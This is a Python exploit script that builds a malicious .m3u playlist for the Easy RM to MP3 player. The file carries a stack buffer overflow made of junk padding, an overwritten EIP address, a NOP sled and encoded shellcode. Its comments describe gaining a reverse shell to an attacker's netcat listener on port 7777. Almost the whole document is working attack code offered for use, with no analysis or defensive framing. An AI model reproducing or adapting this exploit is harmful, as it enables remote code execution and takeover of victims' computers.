#This script provides a shell in the attacking machine.
#usage: 1)Create a connection to the attacker machine using netcat using port 7777. eg, nc 192.168.0.1 7777
#		2)Run this script to create shellyeasyrm.m3u file
#		3)Load the shellyeasyrm.m3u file in the easy rm to mp3 player and you have a shell.
import sys
header=("#EXTM3U\r\n")
title=("#EXTINF:123, Sample artist - Sample title\r\n")
junk1="A" * 35027
eip="\x57\x89\x08\x3E"
nops="\x90"*500
buf =  ""
buf += "\x29\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x8e\x93\x8c\xf0\x83\xee\xfc\xe2\xf4\x72\x7b"
buf += "\x0e\xf0\x8e\x93\xec\x79\x6b\xa2\x4c\x94\x05\xc3\xbc"
buf += "\x7b\xdc\x9f\x07\xa2\x9a\x18\xfe\xd8\x81\x24\xc6\xd6"
buf += "\xbf\x6c\x20\xcc\xef\xef\x8e\xdc\xae\x52\x43\xfd\x8f"
buf += "\x54\x6e\x02\xdc\xc4\x07\xa2\x9e\x18\xc6\xcc\x05\xdf"
buf += "\x9d\x88\x6d\xdb\x8d\x21\xdf\x18\xd5\xd0\x8f\x40\x07"
buf += "\xb9\x96\x70\xb6\xb9\x05\xa7\x07\xf1\x58\xa2\x73\x5c"
buf += "\x4f\x5c\x81\xf1\x49\xab\x6c\x85\x78\x90\xf1\x08\xb5"
buf += "\xee\xa8\x85\x6a\xcb\x07\xa8\xaa\x92\x5f\x96\x05\x9f"
buf += "\xc7\x7b\xd6\x8f\x8d\x23\x05\x97\x07\xf1\x5e\x1a\xc8"
buf += "\xd4\xaa\xc8\xd7\x91\xd7\xc9\xdd\x0f\x6e\xcc\xd3\xaa"
buf += "\x05\x81\x67\x7d\xd3\xfb\xbf\xc2\x8e\x93\xe4\x87\xfd"
buf += "\xa1\xd3\xa4\xe6\xdf\xfb\xd6\x89\x6c\x59\x48\x1e\x92"
buf += "\x8c\xf0\xa7\x57\xd8\xa0\xe6\xba\x0c\x9b\x8e\x6c\x59"
buf += "\x9a\x86\xca\xdc\x12\x73\xd3\xdc\xb0\xde\xfb\x66\xff"
buf += "\x51\x73\x73\x25\x19\xfb\x8e\xf0\x90\xf2\x05\x16\xe4"
buf += "\x83\xda\xa7\xe6\x51\x57\xc7\xe9\x6c\x59\xa7\xe6\x24"
buf += "\x65\xc8\x71\x6c\x59\xa7\xe6\xe7\x60\xcb\x6f\x6c\x59"
buf += "\xa7\x19\xfb\xf9\x9e\xc3\xf2\x73\x25\xe6\xf0\xe1\x94"
buf += "\x8e\x1a\x6f\xa7\xd9\xc4\xbd\x06\xe4\x81\xd5\xa6\x6c"
buf += "\x6e\xea\x37\xca\xb7\xb0\xf1\x8f\x1e\xc8\xd4\x9e\x55"
buf += "\x8c\xb4\xda\xc3\xda\xa6\xd8\xd5\xda\xbe\xd8\xc5\xdf"
buf += "\xa6\xe6\xea\x40\xcf\x08\x6c\x59\x79\x6e\xdd\xda\xb6"
buf += "\x71\xa3\xe4\xf8\x09\x8e\xec\x0f\x5b\x28\x7c\x45\x2c"
buf += "\xc5\xe4\x56\x1b\x2e\x11\x0f\x5b\xaf\x8a\x8c\x84\x13"
buf += "\x77\x10\xfb\x96\x37\xb7\x9d\xe1\xe3\x9a\x8e\xc0\x73"
buf += "\x25"

payload=junk1+eip+nops+buf
path=("C:/")
end_of_path=("/My Music/Greatest HitsExample.ogg")
try:
	exploit=open("C:\Documents and Settings\Troony\Desktop\Exploits\shellyeasyrm.m3u", "w") #creates an m3u file in the location
	exploit.write(header + title+ path + payload  + end_of_path)	#creates a file with the appropriate m3u file.

except Exception as err:
	print("Could Not Create file.")
	print(Err)
	sys.exit()